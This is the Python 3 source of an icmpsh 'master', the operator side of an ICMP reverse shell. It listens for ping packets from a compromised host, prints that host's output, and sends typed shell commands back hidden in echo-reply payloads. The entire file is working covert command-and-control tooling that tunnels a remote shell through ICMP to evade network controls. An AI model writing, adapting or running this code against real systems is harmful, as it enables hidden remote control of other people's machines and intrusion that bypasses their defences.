#!/usr/bin/env python3
"""Simple Python 3 ICMP reverse shell master.

This listens for ICMP echo requests from an icmpsh slave and replies with
command payloads in ICMP echo replies.
"""

from __future__ import annotations

import argparse
import socket
import struct

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0


def checksum(data: bytes) -> int:
    """Return the Internet checksum for the supplied payload."""
    if len(data) % 2:
        data += b"\x00"

    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]

    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return (~total) & 0xFFFF


def build_reply(identifier: int, sequence: int, payload: bytes) -> bytes:
    """Create an ICMP echo reply packet."""
    header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, 0, identifier, sequence)
    packet_checksum = checksum(header + payload)
    header = struct.pack(
        "!BBHHH",
        ICMP_ECHO_REPLY,
        0,
        socket.htons(packet_checksum),
        identifier,
        sequence,
    )
    return header + payload


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Python 3 icmpsh master")
    parser.add_argument(
        "-b",
        "--bind",
        default="0.0.0.0",
        help="local address to bind for incoming ICMP packets",
    )
    parser.add_argument(
        "-t",
        "--target",
        required=True,
        help="expected slave IP address",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()

    recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    recv_sock.bind((args.bind, 0))

    print("[+] Listening for ICMP packets from", args.target)
    print("[+] Press Ctrl+C to quit")

    while True:
        packet, (source_ip, _) = recv_sock.recvfrom(65535)
        if source_ip != args.target:
            continue

        ip_header_len = (packet[0] & 0x0F) * 4
        icmp_packet = packet[ip_header_len:]
        if len(icmp_packet) < 8:
            continue

        icmp_type, _code, _csum, identifier, sequence = struct.unpack(
            "!BBHHH", icmp_packet[:8]
        )
        if icmp_type != ICMP_ECHO_REQUEST:
            continue

        payload = icmp_packet[8:].rstrip(b"\x00")
        if payload:
            text = payload.decode("utf-8", errors="replace")
            print(text, end="" if text.endswith("\n") else "\n")

        try:
            command = input("icmpsh> ")
        except EOFError:
            command = "exit"

        response_payload = command.encode("utf-8") + b"\x00"
        reply_packet = build_reply(identifier, sequence, response_payload)
        send_sock.sendto(reply_packet, (source_ip, 0))


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\n[+] Exiting")
        raise SystemExit(0)
